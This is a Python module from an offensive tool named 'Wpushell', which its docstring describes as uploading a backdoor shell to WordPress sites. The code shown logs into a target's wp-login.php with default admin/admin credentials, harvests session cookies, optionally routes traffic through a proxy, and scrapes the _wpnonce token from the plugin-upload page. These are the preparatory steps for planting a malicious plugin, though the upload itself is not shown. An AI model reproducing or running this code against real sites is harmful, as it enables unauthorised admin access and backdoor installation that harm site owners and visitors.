#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Wpushell is a tool used to upload a backdoor shell to a site that uses a WordPress Content Management System with a simple and fast process.
Copyright (C) 2022 RandsX

This program is free software: you can redistribute it and/or modify  it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

from aiohttp import ClientSession
from aiohttp import TCPConnector

class ClientRequest:
    """ ClientRequest class """
    def __init__(self, proxy: str, ssl: bool = True) -> None:
        """ Initialize the class """
        from aiohttp_socks import ProxyConnector

        connector = TCPConnector(ssl=ssl)
        if proxy:
            connector = ProxyConnector.from_url(proxy, ssl=ssl)
        self.session = ClientSession(connector=connector, trust_env=True)

    async def get_cookie(self, url: str, username: str = 'admin', password: str = 'admin') -> dict:
        """ get the cookie after login into target """
        url = f'{url}/wp-login.php'
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'rememberme': 'forever',
            'redirect_to': f'{url}/wp-admin',
            'testcookie': '1'
        }
        cookies: dict = {}

        try:
            request = await self.session.post(url, data=data)
            status_code = request.status
            if status_code == 200:
                for cookie in self.session.cookie_jar:
                    cookies[cookie.key] = cookie.value

                if bool(cookies) is False and len(cookies) <= 2:
                    raise Exception('Failed login into the target, please check your credential')
                return cookies
            else:
                raise Exception(f'Server not returned status code 200 OK, returned {status_code}')
        except Exception as error:
            raise Exception(error)

    async def get_wpnonce(self, url: str, cookies: dict) -> str:
        """ Take _wpnonce value from target """
        from bs4 import BeautifulSoup

        url = f'{url}/wp-admin/plugin-install.php?tab=upload'

        try:
            request = await self.session.get(url, cookies=cookies)
            status_code = request.status
            if status_code == 200:
                content = await request.text()
                try:
                    soup = BeautifulSoup(content, 'html.parser')
                    wpnonce = soup.find('input', {'name': '_wpnonce'})['value']
                    if wpnonce is None:
                        raise Exception('Failed to fetch value _wpnonce')
                    return wpnonce
                except Exception as err:
                    raise Exception(err)
            else:
                raise Exception(f'Server not returned status code 200 OK, returned {status_code}')
        except Exception as err:
            raise Exception(err)
